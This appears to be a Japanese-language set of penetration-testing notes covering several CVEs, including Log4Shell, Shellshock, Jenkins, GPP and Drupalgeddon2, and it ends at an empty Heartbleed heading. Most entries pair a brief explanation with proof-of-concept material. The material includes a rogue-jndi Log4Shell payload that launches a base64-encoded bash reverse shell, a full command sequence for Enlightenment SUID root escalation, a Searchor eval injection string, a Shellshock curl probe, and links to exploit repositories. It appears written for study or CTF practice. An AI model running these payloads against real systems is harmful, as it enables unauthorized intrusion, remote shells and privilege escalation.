# CVE-2021-44228
Log4j2とはJavaアプリでログを効率的に記録するためのApacheが開発したオープンソースのライブラリ。  
Log4j2に搭載されていたLookup機能が悪用されたことが原因。  
Lookup機能の一つであるJNDI Lookupはログに特定の文字列`${...}`が含まれている場合、それを変数として評価し、外部リソースからデータを取得する機能。  
この機能が外部のLDAPへの参照を処理する場合に、外部から指定された任意のJavaオブジェクトのクラスファイルをダウンロードし、アプリ内で実行してしまう。

## PoC（Unifi 6.4.54のログインフォーム）
バージョン`6.5.53`以前が影響を受けていたため  
ログインフォームのリクエスト内にあるJSONオブジェクト、`remember`を使用。  
`"remember":"${jndi.ldap://<IP>:1389/o=tomcat}"`
```bash
# LDAPサーバーを起動し、悪意のあるJavaクラスを返すためにrogue-jndiを使用
git clone https://github.com/veracode-research/rogue-jndi
mvn package # Mavenでビルド
echo '<リバースシェル>' | base64 # リバースシェルをbase64エンコード
java -jar target/RogueJndi-1.1 --command "bash -c {echo,<Base64エンコードしたリバースシェル>}|{base64,-d}|{bash,-i}" --hostname <ターゲット>
# rogue-jndiで起動したLDAPサーバーへアクセスし、Javaクラスをダウンロードしてリバースシェルが実行される。
```

# CVE-2023-46604
Apache ActiveMQとはオープンソースのJavaベースのメッセージブローカー。  
Apache ActiveMQが使用するOpenWireプロトコルの処理方法に起因していて、メッセージ内のデータを十分に検証せずデシリアライズしてしまうことにより任意のクラスをロードしてRCEに繋がってしまう。

## PoC（ActiveMQ 5.15.5）
[https://github.com/strikoder/CVE-2023-46604-ActiveMQ-RCE-Python](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ)

## 影響バージョン
Apache ActiveMQ　5.18.0 ～ 5.18.2  
Apache ActiveMQ　5.17.0 ～ 5.17.5  
Apache ActiveMQ　5.16.0 ～ 5.16.6  
Apache ActiveMQ　～ 5.15.15

# CVE-2023-30253
Dolibarr ERP/CRM（バージョン17.0.0以下）に存在する脆弱性。Dolibarr ERP/CRMとは中小企業、フリーランサー、団体向けに設計されたオープンソースの統合ビジネス管理ソフトウェアである。  
DolibarrにはWebサイト作成機能があり、ユーザーはHTMLを入力できる。HTMLに埋め込みでphpコードを使用できないようにするフィルタが不適切であったため、RCEが可能となった。

## PoC (Dolibarr <= 17.0.0)
https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

# CVE-2022-37706
X Window SystemおよびWayland向けの軽量で高機能なウィンドウマネージャであり、`enlightenment_sys`はUSBメモリを差し込んだ時に認識できるようにするもの。  
Enlightenment 0.25.4未満のバージョンにおける`enlightenment_sys`は、SUIDバイナリであるためローカルユーザーが特権を取得できる脆弱性を持ち、システムライブラリ関数が`/dev/..`という部分文字列で始まるパス名を適切に処理しない。それによりOSコマンドインジェクションが成立する。

## PoC
```bash
enlightenment --version # バージョン確認
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit" # プログラム実行時にOSは;の箇所で処理を区切るため、/tmp/exploit(/bin/sh)をsuidで実行させるための特殊なフォルダ名。
echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit # 権限付与
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

# CVE-2023-43364
Seachorにある脆弱性。Seachorとは検索エンジンを使用する際にURLを生成するオープンソースのPythonスクリプト。  
ユーザーからの入力の検証が不十分であったため、RCEが可能。

## 脆弱なコード
`url = eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")`  
`query`部分がユーザーからの入力で、そのままevalに含めているためPythonコードとしてそのまま使用されてしまう。  
`', exec("<任意のPythonコード>"))#`といった入力がRCEにつながる。  
https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b#diff-40a1b591e95ee135f3f26e8ffa117a4816c202b6ce76852be85018fed09c4436

## PoC（Seachor <= 2.4.0）
https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-

# CVE-2014-6271
ShellShockとも呼ばれるbashの脆弱性。環境変数に関数を定義し、それを子プロセスに引き継ぐ機能の悪用。  
関数定義後の文字列までコマンドとしてbashが認識して実行してしまうことによる問題。昔のシステムはCGIとしてbashを使用していることが多く、Web経由でRCEが可能になる場合がある。

## CGIのシェルスクリプトが脆弱かどうかのチェック
```bash
curl -H "User-Agent: () { :; }; echo; /usr/bin/id" <CGIのシェルスクリプトのURL>
```

# CVE-2024-23897
Jenkins CLIが内部で使用している`args4j`というライブラリにある脆弱性。  
このライブラリには引数の先頭に`@`があると、それをファイルパスとして扱う。  
その際に出力されるエラーメッセージにファイルの中身が表示されてしまうため、任意のファイルを読み込むことが可能。

## PoC（Jenkins <= 2.441）
https://github.com/godylockz/CVE-2024-23897

# CVE-2014-1812
Windows ServerのGPP機能における脆弱性。ドメイン管理者が全PCのローカル管理者パスワードの一括設定ができる便利な仕組みが存在。  
この設定を行うと以下の場所に設定ファイルが生成される。  
`\\<ドメイン>\SYSVOL\<ドメイン>\Policies\{<GUID>}\Machine\Preferences\Groups\Groups.xml`  
このXMLファイル内に保存されるcpasswordをAES-256で暗号化していたが、復号の対象鍵が固定されていたのと、その鍵をMSDNに載せていたため現在では無効化されている。  
```bash
# cpassword
暗号化された本体とBase64エンコードされた暗号文で構成される。
# 復号
暗号文をBase64デコードする
MSDNに公開されていた32バイト(256bit)の固定鍵を用意する
AES 256 CBC（IVは0固定）で復号する
```
## PoC
https://github.com/t0thkr1s/gpp-decrypt/blob/master/gpp-decrypt.py

# CVE-2018-7600
DrupalというCMSに存在するRCEの脆弱性。  
DrupalのForm APIという機能はユーザー入力を処理する際に`#`をつけるとレンダリングする仕様がある。  
攻撃者はURLのパラメータやPOSTデータの中に`#post_render`のようなキーを仕組むと、Drupalが検証をせずに中身のPHP関数が実行される。

## PoC
https://github.com/dreadlocked/Drupalgeddon2

# CVE-2014-0160（heartbleed）
